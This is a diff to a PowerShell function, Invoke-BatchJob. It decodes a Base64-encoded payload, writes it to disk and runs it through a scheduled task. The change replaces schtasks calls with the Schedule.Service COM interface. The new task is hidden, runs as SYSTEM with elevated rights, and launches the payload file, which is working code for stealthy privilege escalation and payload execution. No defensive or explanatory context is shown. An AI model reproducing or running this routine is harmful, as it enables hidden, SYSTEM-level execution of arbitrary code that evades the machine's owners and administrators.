@@ -73,16 +73,28 @@ Function Invoke-BatchJob()
 
     If (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
     {
+        # Decode and write payload to disk
         [String] $Payload = ([System.Text.Encoding]::ASCII.GetString(([Convert]::FromBase64CharArray($EncodedPayload, 0, $EncodedPayload.Length))) -f $InputFile)
-        If (Test-Path -Path $Path)
-        {
-            Remove-Item -Path $Path -Force
-        }
-        Add-Content -Path $Path -Value $Payload -Force
-        # TODO Make this a COM object 
-        Invoke-Expression -Command ("schtasks /CREATE /RU 'NT AUTHORITY\SYSTEM' /SC Once /TR '{0}' /TN '{1}' /F /Z" -f $Path, $TaskName) | Out-Null
-        Invoke-Expression -Command ("schtasks /RUN /TN '{0}' /I" -f $TaskName) | Out-Null
-        Get-Item -Path $InputFile
+        Set-Content -Path $Path -Value $Payload -Force -ErrorAction 'Stop'
+
+        # Connect to Schedule.Service COM Object
+        $ScheduledService = New-Object -ComObject "Schedule.Service"
+        $ScheduledService.Connect()
+
+        # Define Scheduled Task
+        $TaskDefinition = $ScheduledService.NewTask(0)
+        $TaskDefinition.Settings.Hidden = $True
+        $TaskDefinition.Settings.StartWhenAvailable = $True
+        $TaskDefinition.Principal.UserId = "S-1-5-18"
+        $TaskDefinition.Principal.RunLevel = 1
+        $Trigger = $TaskDefinition.Triggers.Create(7)
+        $Trigger.Id = "TriggerID"
+        $Action = $TaskDefinition.Actions.Create(0)
+        $Action.Path = ('"{0}"' -f $Path)
+
+        # Register scheduled task in "\" path
+        $RootFolder = $ScheduledService.GetFolder("\")
+        $RootFolder.RegisterTaskDefinition($TaskName, $TaskDefinition, 6, $Null, $Null, 3)
     }
     Else
     {
